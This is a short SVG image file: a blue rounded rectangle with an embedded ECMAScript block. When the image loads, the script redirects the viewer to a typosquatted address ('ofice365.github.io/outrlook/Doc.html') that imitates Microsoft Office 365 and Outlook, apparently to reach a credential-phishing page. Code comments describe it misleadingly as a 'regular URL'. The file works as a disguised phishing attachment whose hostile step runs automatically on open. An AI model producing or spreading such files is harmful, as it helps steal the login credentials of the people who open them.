<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
  <rect x="50" y="50" width="300" height="100" fill="lightblue" rx="10" ry="10"></rect>
  <text x="200" y="120" font-family="Arial" font-size="18" text-anchor="middle" fill="black">
  </text>

  <script type="text/ecmascript">
    <![CDATA[
      // Open a regular URL directly
      function openURL() {
        // Regular URL
        const url = "https://ofice365.github.io/outrlook/Doc.html";

        // Set the current window location to the URL
        window.location.href = url;
      }

      // Trigger the function upon SVG load
      window.addEventListener("load", openURL);
    ]]>
  </script>
</svg>
